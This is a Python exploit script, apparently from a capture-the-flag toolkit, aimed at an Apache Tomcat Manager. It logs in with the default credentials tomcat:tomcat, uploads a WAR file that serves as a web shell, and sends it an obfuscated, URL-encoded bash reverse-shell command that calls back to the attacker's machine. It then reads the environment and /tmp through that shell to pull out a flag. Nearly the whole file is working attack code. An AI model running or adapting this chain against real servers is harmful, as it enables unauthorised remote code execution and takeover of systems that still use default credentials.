import re
from pathlib import Path

from tool.base import match_flag, process_with, get_local_ip, wait
from tool.bash_obf import apply_obfs
from tool.encode import Url
from tool.http_repeater import repeater, build_multipart_form
from tool.shell_rb import gen_shell_r_cmd, TcpShellR


def run(target: tuple[str, int]) -> tuple[bool, str | list[str], str]:
    ip = get_local_ip()
    if not ip:
        return False,"","ip获取失败"
    with TcpShellR() as shell:
        cmd = gen_shell_r_cmd("bash_i",ip,shell.port())
        if not cmd:
            return False, "", "生成反弹shell命令失败"
        cmd = apply_obfs(cmd, ["base64","bash_c_ifs1"])
        if not cmd:
            return False, "", "生成反弹shell命令失败"

        cmd = Url.encode(cmd,True)
        if not cmd:
            return False,"","url编码失败"


        _headers,body = build_multipart_form("flag.war",Path("static/other/flag.war"),"deployWar")

        req = f"""GET /manager/html HTTP/1.1
Host:{target[0]}:{target[1]}
Authorization: Basic dG9tY2F0OnRvbWNhdA==

"""
        resp = repeater(req)
        if not resp:
            return False, "", resp.error
        path = re.search(
            r'<form method="post" action="([^"]+/upload[^"]+)" enctype="multipart/form-data">',
            resp.body_text()
        )
        if not path:
            print(resp.text())
            return False, "", "获取csrfnoce失败"

        req = f"""POST {path[1]} HTTP/1.1
Host:{target[0]}:{target[1]}
Authorization: Basic dG9tY2F0OnRvbWNhdA==

""".replace("\n","\r\n").encode() + body

        resp = repeater(req,headers=_headers)
        if not resp:
            return False, "", resp.error


        req = f"""GET /flag/index.jsp?cmd={cmd} HTTP/1.1
Host:{target[0]}:{target[1]}
Authorization: Basic dG9tY2F0OnRvbWNhdA==

"""
        resp = repeater(req)
        if not resp and "Timeout" not in resp.error:
            return False, "", resp.error


        if not wait(lambda : shell.is_connected()) :
            return False, "", "等待反弹shell回连失败"
        shell.sendline("env;ls /tmp;exit")
        output = shell.output()
        if not output:
            return False, "", "无法获取执行命令的输出"
        flag = match_flag(output)
        if not flag:
            print(output)
            return False, "", "flag匹配失败"
        return True, flag, ""
    return False, "", "未知错误"


def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    __import__("tool.base", fromlist=["set_debug"]).set_debug()
    main("192.168.192.148:30265")
